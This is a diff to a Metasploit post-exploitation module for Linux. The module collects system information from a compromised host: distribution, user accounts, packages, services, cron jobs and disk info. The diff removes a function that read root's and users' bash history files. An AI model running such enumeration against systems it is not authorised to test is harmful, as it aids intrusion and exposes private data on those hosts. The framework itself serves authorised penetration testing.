@@ -1,8 +1,8 @@
 ##
-# ## This file is part of the Metasploit Framework and may be subject to
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
 ##
 
 require 'msf/core'
@@ -42,7 +42,6 @@ class Metasploit3 < Msf::Post
 
 	end
 
-	# Run Method for when run command is issued
 	def run
 		distro = get_sysinfo
 		store_loot(
@@ -65,15 +64,16 @@ class Metasploit3 < Msf::Post
 		installed_svc = get_services(distro[:distro])
 
 		mount = execute("/bin/mount -l")
-		get_bash_history(users, user)
 		crons = get_crons(users, user)
-		
+		diskspace = execute("/bin/df -ahT")
+		disks = (mount +"\n\/"+ diskspace)
+
 		save("Linux version", distro)
 		save("User accounts", users)
 		save("Installed Packages", installed_pkg)
 		save("Running Services", installed_svc)
 		save("Cron jobs", crons)
-		save("Mount", mount)
+		save("Disk info", disks)
 
 	end
 
@@ -171,27 +171,4 @@ class Metasploit3 < Msf::Post
 		return cron_data
 
 	end
-
-	def get_bash_history(users, user)
-		if user == "root" and users != nil
-			users = users.chomp.split()
-			users.each do |u|
-				if u == "root"
-					vprint_status("Extracting history for #{u}")
-					hist = cat_file("/root/.bash_history")
-				else
-					vprint_status("Extracting history for #{u}")
-					hist = cat_file("/home/#{u}/.bash_history")
-				end
-
-				save("History for #{u}", hist) unless hist =~ /No such file or directory/
-			end
-		else
-			vprint_status("Extracting history for #{user}")
-			hist = cat_file("/home/#{user}/.bash_history")
-			vprint_status(hist)
-			save("History for #{user}", hist) unless hist =~ /No such file or directory/
-		end
-	end
-
 end
